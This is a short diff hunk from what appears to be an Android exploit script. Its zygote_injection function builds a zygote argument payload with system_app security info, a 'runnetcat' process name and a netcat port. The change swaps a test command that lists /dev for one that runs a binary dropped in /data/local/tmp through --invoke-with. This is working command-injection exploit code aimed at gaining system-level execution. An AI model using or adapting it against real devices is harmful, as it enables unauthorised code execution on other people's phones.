@@ -116,7 +116,7 @@ zygote_injection() {
 --nice-name=runnetcat
 --seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete
 --invoke-with
-/system/bin/ls /dev >/sdcard/02.txt
+/data/local/tmp/copy
 "\n' "$uid" "$uid" "$NC_PORT"
 }
 
